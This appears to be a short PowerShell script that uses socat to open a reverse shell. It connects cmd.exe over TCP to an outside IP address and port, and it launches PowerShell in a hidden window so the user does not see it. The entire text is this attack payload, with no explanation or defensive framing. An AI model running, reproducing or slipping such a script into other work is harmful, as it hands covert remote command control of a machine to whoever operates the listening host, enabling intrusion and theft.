$command = ".\socat.exe tcp-connect:3.127.59.75:16902 exec:""cmd.exe"",pipes"
Start-Process "powershell.exe" -ArgumentList "-NoProfile -Command `"& { $command }`"" -WindowStyle Hidden
